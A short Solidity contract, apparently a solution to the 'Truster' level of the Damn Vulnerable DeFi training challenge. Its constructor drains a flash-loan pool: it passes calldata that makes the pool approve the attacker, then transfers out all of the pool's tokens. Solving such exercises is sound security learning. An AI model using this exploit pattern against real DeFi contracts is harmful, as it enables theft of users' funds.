// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

/**
 * @title HackTrusterLenderPool
 * @author Camillebzd
 */
contract HackTrusterLenderPool {
    constructor(TrusterLenderPool _pool, DamnValuableToken _token, uint256 amount) {
        bool success = _pool.flashLoan(amount, address(_pool), address(_token), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        require(success, "flashloan failed");
        _token.transferFrom(address(_pool), msg.sender, amount);
    }
}